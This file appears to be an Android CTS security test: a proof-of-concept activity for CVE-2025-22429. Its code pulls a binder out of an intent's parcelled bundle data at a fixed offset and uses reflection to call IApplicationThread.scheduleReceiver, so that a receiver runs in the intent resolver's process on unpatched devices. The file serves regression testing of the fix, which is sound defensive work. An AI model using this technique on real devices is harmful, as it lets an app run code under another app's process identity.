/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2025_22429;

import android.app.Activity;
import android.app.IApplicationThread;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.os.BaseBundle;
import android.os.IBinder;
import android.os.Parcel;

import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.stream.Stream;

public class PocActivity extends Activity {

    @Override
    protected void onResume() {
        super.onResume();
        try {
            // Fetch the 'mParcelledData' from 'BaseBundle' and further fetch binder from it.
            final Parcel fetchedParcel =
                    (Parcel)
                            CVE_2025_22429
                                    .getDeclaredField(BaseBundle.class, "mParcelledData")
                                    .get(getIntent().getExtras());
            fetchedParcel.setDataPosition(244);
            final IBinder binder = fetchedParcel.readStrongBinder();
            if (binder != null) {
                // Create an 'ActivityInfo' for 'PocBroadcastReceiver'.
                final ActivityInfo activityInfo = new ActivityInfo();
                activityInfo.applicationInfo = getApplicationInfo();
                activityInfo.name = PocBroadcastReceiver.class.getName();

                // Fetch 'ApplicationThread' to schedule a receiver.
                // Without fix, it gets scheduled and a broadcast is sent to 'CVE_2025_22429'
                // with its process name equals to 'com.android.intentresolver'.
                final IApplicationThread applicationThread =
                        IApplicationThread.Stub.asInterface(binder);
                invokeScheduleReceiverMethod(applicationThread, activityInfo);
                return;
            }
            sendBroadcast(
                    new Intent(CVE_2025_22429.BROADCAST_ACTION)
                            .putExtra(CVE_2025_22429.UNEXPECTED_EXCEPTION, (Exception) null)
                            .putExtra(CVE_2025_22429.PROCESSNAME_FOR_POCRECEIVER, "null"));
        } catch (Exception e) {
            sendBroadcast(
                    new Intent(CVE_2025_22429.BROADCAST_ACTION)
                            .putExtra(CVE_2025_22429.UNEXPECTED_EXCEPTION, e));
        }
    }

    private void invokeScheduleReceiverMethod(
            IApplicationThread applicationThread, ActivityInfo activityInfo) throws Exception {
        for (Method method : IApplicationThread.class.getDeclaredMethods()) {
            if (method.getName().endsWith("scheduleReceiver")) {
                method.setAccessible(true);
                method.invoke(
                        applicationThread,
                        Stream.concat(
                                        Stream.of(
                                                new Intent(this, PocBroadcastReceiver.class),
                                                activityInfo),
                                        Arrays.stream(method.getParameterTypes())
                                                .skip(2)
                                                .map(
                                                        param ->
                                                                (param.isPrimitive()
                                                                        ? (param == boolean.class
                                                                                ? false
                                                                                : 0)
                                                                        : null)))
                                .toArray());
                return;
            }
        }
        throw new IllegalStateException("No 'scheduleReceiver()' method was found");
    }
}
